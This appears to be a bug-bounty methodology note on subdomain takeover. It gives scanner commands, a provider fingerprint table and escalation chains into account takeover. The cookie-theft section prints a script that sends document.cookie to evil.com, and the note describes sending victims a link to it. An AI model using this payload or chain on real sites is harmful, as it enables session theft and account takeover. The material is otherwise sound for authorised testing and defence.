# Subdomain Takeover — chains into ATO/cookie theft

> Stand-alone usually pays $100-$500. Chained into cookie scope ATO or OAuth callback bypass: $5K-$15K.

---

## CONCEPT

A subdomain has a CNAME pointing to a third-party host (Heroku, AWS S3, GitHub Pages, etc.) but the resource at that target was deleted. Attacker re-creates the resource with the same name -> they now serve content on the target's subdomain.

---

## STAGE 1 — Discovery

```bash
# All subdomains -> CNAME map
dnsx -l all_subs.txt -cname -resp -silent | tee cnames.txt

# Auto-takeover scanners
subzy run --targets all_subs.txt --concurrency 100 --hide_fails
nuclei -l all_subs.txt -t takeovers/ -severity high,critical -silent
subjack -w all_subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v
takeover -l all_subs.txt
```

Cross-check positives manually before claiming.

---

## STAGE 2 — Provider catalog (current as of late 2025)

| Provider | CNAME signal | Vulnerable response | Claim method |
|---|---|---|---|
| AWS S3 | `*.s3.amazonaws.com` | "NoSuchBucket" | Create bucket with same name |
| AWS CloudFront | `*.cloudfront.net` | "Bad request" / not configured | New CF distribution + alt domain |
| AWS Elastic Beanstalk | `*.elasticbeanstalk.com` | NXDOMAIN | Re-deploy with same env |
| GitHub Pages | `*.github.io` | "There isn't a GitHub Pages site here" | Make repo with custom domain |
| GitLab Pages | `*.gitlab.io` | similar | |
| Heroku | `*.herokuapp.com` | "No such app" | Re-register app name |
| Bitbucket Pages | `*.bitbucket.io` | similar | |
| Tumblr | custom | "There's nothing here" | claim username |
| Shopify | `myshopify.com` | "Sorry, this shop is currently unavailable" | claim shop |
| Tilda | `*.tilda.ws` | similar | Note: requires email verification of original |
| Surge | `*.surge.sh` | NXDOMAIN | Re-deploy site |
| Fastly | custom | "Fastly error: unknown domain" | Add domain to Fastly account |
| Pantheon | `*.pantheonsite.io` | "404 - The requested resource not found" | |
| Acquia | `*.acquia-sites.com` | similar | |
| WordPress | `*.wordpress.com` | "Do you want to register" | claim sub |
| Wix | configured custom | "Error 404" with Wix branding | claim site |
| Webflow | `*.webflow.io` | "The page you are looking for doesn't exist" | claim site |
| Tilda | `*.tilda.ws` | | |
| Strikingly | `*.strikinglydns.com` | | |
| UptimeRobot | `stats.uptimerobot.com` | | |
| Unbounce | `*.unbouncepages.com` | | |
| Statuspage | `*.statuspage.io` | | |
| Helpjuice | `*.helpjuice.com` | | |
| Hatena | similar | | |
| Microsoft Azure | `*.cloudapp.net`, `*.azurewebsites.net`, `*.cloudapp.azure.com`, `*.azureedge.net`, `*.trafficmanager.net`, `*.blob.core.windows.net` | varies | Many Azure services subject to takeover |
| Vercel | `*.vercel.app` | | |
| Netlify | `*.netlify.app` | | |
| Render | `*.onrender.com` | | |
| Cargo | `*.cargo.site` | | |
| Cargocollective | `*.cargocollective.com` | | |

For latest fingerprints, use the current `subzy` / `nuclei takeovers/` templates — they're maintained.

---

## STAGE 3 — Validate without claiming

Most BBPs allow PoC via DNS-only proof or claiming with a benign placeholder page. Many programs explicitly forbid actually claiming.

PoC steps (program permitting):
1. Confirm CNAME points to dangling resource
2. Show provider's "vulnerable" response
3. (If allowed) claim resource with "Owned by <your handle> — bug bounty PoC"
4. Take screenshot, immediately release / delete

If unsure, do step 1 + 2 only and let the program escalate.

---

## STAGE 4 — Impact escalation (the $10K gate)

### A. Cookie theft via cookie scope
If `target.com` sets cookies with `Domain=.target.com`, **any** subdomain reads them. Take over `legacy.target.com` -> serve attacker JS that exfiltrates cookies -> ATO.

```html
<script>fetch('//evil.com/?c='+document.cookie)</script>
```
Send link to `legacy.target.com` to victims.

### B. OAuth `redirect_uri` allowlist bypass
If `target.com`'s OAuth allowlists `*.target.com` as callback domain, take over `legacy.target.com` -> register callback there -> intercept OAuth codes.

### C. CSP `script-src` allowlist bypass
CSP allows `*.target.com` for scripts. Subdomain takeover -> host attacker scripts in CSP-allowed origin -> stored XSS that was previously blocked now works.

### D. Email spoofing via SPF include
SPF record `include:legacy.target.com` -> if you control DNS records there (or take over its mail provider), you can authorize email-sending IPs and spoof target.com emails.

### E. Phishing
Branded subdomain phishing — `support.target.com/login` looks legit -> high success rate.

---

## CHAIN RECIPE — Sub-takeover -> ATO

1. `nuclei takeovers/` finds `cdn.target.com -> NoSuchBucket on S3`
2. Confirm: `dig cdn.target.com` shows CNAME to `cdn-target-com.s3.amazonaws.com`
3. With program approval: claim S3 bucket `cdn-target-com`, upload PoC HTML
4. Visit `https://cdn.target.com/poc.html` -> attacker content served
5. Show cookie attribute: `target.com` sets `session=...; Domain=.target.com`
6. Send victim a link to `https://cdn.target.com/poc.html` containing JS that reads `document.cookie`
7. Cookie exfil -> ATO

Report value: $5K-$15K depending on cookie sensitivity and userbase.

---

## VALIDATION CHECKLIST

- DNS resolution + provider response (screenshot)
- Provider's specific "vulnerable" indicator (text, status code)
- If claimed: brief PoC content with bug bounty marker, then delete
- Document the cookie-scope or callback chain if escalating
- Suggest fix: remove dangling DNS, add monitoring (Domain Patrol, certspotter)

---

## TOOLING

- **subzy** (latest fingerprints)
- **nuclei** `-t takeovers/`
- **subjack** (older but reliable)
- **takeover** (Go, fast)
- **CanITakeOverXYZ** wiki (canonical fingerprint list)
- **Domain Patrol** (defensive monitoring)
